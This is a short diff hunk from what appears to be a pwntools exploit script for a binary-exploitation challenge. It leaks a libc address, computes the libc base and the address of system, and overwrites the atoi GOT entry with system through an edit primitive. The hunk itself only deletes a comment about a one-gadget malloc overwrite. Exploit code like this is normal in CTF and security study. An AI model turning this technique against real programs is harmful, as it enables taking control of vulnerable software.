@@ -170,7 +170,7 @@ p.recvuntil(b"Data = ")
 libc=int.from_bytes(p.recv(6),"little")-424032
 log.info("[+]libc base"+hex(libc))
 
-#### stage 4 overwrite malloc with onegadget#######
+
 atoi_got=0x602068
 system=libc+0x3f550
 edit(3, 8,p64(atoi_got))				#over_write atoi_got to system (readInt() func)
